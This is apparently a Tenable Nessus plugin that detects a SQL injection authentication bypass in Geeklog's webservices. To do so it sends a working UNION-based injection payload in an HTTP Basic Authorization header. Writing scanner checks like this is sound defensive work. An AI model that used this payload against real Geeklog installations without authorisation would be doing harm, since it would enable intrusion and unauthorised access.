#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36144);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(34456);
  script_xref(name:"milw0rm", value:"8376");
  script_xref(name:"OSVDB", value:"53594");

  script_name(english:"Geeklog SEC_authenticate Function SQL Injection");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is prone to a SQL\n",
      "injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The version of Geeklog installed on the remote host fails to sanitize\n",
      "input to the 'username' argument of the 'SEC_authenticate' function in\n",
      "'/system/lib-security.php' before using it to construct database\n",
      "queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an\n",
      "unauthenticated attacker can exploit this issue to manipulate database\n",
      "queries to, for example, bypass authentication and gain access to\n",
      "dangerous functions, which in turn could allow for arbitrary code\n",
      "execution."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.geeklog.net/article.php/webservices-exploit"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Configure Geeklog to disable Webservices."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


password = SCRIPT_NAME;
exploit = string(
  "' AND 0 UNION SELECT 3,MD5('", password, "'),null,2 LIMIT 1 -- "
);



# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to bypass authentication.
  url = string(dir, "/webservices/atom/index.php?introspection");

  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array(
      'Authorization',
      string('Basic ', base64(str:exploit+":"+password))
    )
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we've bypassed authentication.
  if (
    '<app:service' >< res[2] &&
    '?plugin=staticpages">' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req_str, "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}
